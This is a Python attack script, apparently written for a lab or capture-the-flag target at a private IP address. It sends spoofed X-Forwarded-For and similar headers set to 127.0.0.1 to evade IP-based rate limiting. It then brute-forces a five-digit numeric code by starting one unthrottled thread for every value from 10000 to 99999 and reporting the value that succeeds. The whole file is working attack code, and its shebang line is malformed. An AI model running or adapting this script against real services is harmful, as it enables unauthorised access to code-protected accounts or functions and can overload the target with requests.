#/usr/bin/env python3 


import requests
import threading




url = "http://10.10.110.219:8085"
headers = {
            "X-Forwarded-For": "127.0.0.1",
            "X-Forwarded-Host": "127.0.0.1",
            "X-Client-IP": "127.0.0.1",
            "X-Remote-IP": "127.0.0.1",
            "X-Remote-Addr": "127.0.0.1",
            "X-Host": "127.0.0.1"
        }


session = requests.session()

def bruteForce(i):
    #for i in range(i):
        data = {'number': i}
    
        r = session.post(url, data=data, headers=headers)
        response = str(r.text)
    
        rateLimit = "error"
        findStr = "Oh no!"

        if findStr in response:
            print(f'Trying number: {i}')
        elif rateLimit in response:
            print("rate limit hit")
        else:
            print(f'Found the lucky key {i}', r.text)
            
            

threads = []
for i in range(10000,99999):
    thread = threading.Thread(target=bruteForce, args=(i,))
    thread.start()
    threads.append(thread)


